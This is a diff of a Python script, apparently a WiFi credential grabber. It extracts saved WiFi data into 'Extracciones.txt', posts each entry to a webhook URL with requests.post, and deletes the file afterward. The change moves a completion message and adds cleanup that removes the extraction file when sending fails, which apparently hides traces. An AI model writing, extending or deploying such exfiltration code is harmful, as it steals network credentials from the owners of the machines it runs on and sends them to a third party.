@@ -24,11 +24,10 @@ def main(url, only_webhook, version):
         extractor()
         os.remove('Extracciones.txt')
         urlweb(url)
-        print('\nDone! \n\nHecho!\n')
+        
     elif url != '' and only_webhook == False:
         extractor()
         urlweb(url)
-        print('\nDone! \n\nHecho!\n')
     else:
         extractor()
         print('\nDone! \n\nHecho!\n')
@@ -77,9 +76,13 @@ def urlweb(url):
         #envia los datos a la url de webhook
         for i in WIFIs:
             requests.post(urlpost, data=i)
+        print('\nDone! \n\nHecho!\n')
     except:
         print('\nError could not send: url not specified or invalid url | url no especificada o es invalida\n')
-        exit()
+        try:
+            os.remove('Extracciones.txt')
+        except:
+            exit()
 
 if __name__ == '__main__':
     main()
